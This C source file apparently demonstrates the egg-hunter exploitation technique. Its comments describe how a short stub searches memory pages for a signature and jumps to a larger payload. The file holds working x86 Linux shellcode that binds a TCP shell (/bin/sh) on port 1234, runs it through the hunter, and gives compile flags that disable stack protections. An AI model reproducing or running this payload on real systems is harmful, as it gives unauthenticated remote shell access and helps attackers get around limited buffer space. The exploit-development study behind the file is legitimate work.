#include <stdio.h>

/*
 *  Scope of this code is to demonstrate how we can exploit a program when the space for the shellcode is limited
 *  1. we place the real long shellcode somewhere (shellcode[])
 *  2. we execute a shorter code called egg-hunter(egg_hunter[])
 *
 *  How it works
 *  1. The long shellcode contains a combnation of NOP and inc eax opcodes as a signature (\x9050905090509050), in total 8 bytes
 *  2. The egg_hunter loops through the virtual memory pages (4 KB) and looks thourh
 *    2.1 using access it tries to access the first byte of a page (page alignement of edx)
 *    2.2 if not possibile it jump to next page
 *    2.3 if possibile it scans the page and compare 4 bytes and then the other 4 bytes
 *    2.4 if both matches, it jmp to that address
 *
 *    As a reference look at egg.asm code
 *
 *    Compile with:  
 *      gcc -fno-stack-protector -z execstack
*/



int main(void)
{
	char shellcode []= "\x90\x50\x90\x50\x90\x50\x90\x50\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x04\xd2\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
	char egg_hunter[] = "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

	void (*s)() = (void *)egg_hunter;
	s();
}

